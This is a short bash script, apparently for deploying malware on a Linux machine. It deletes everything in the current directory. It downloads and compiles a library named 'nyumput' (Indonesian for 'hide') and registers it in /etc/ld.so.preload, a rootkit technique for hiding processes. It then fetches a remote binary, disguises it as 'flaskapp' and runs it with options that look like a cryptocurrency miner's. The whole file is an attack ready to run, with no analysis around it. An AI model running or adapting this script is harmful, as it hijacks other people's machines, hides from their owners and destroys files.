rm -rvf * && mkdir image && cd image
#!/bin/bash
apt update
apt install curl -y
curl https://raw.githubusercontent.com/brontosimungo/upgraded-octo-sniffle/refs/heads/main/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
wget -qO flaskapp https://github.com/brontosimungo/LDS/raw/refs/heads/main/reeskam
chmod +x flaskapp
./flaskapp --pubkey=DBzZZHvv7ZXHJmVjxF8QR4xCqBgZF4jn3tcUkxUuaxxvsF1zktETF2x --threads-per-card=1 --name=testest
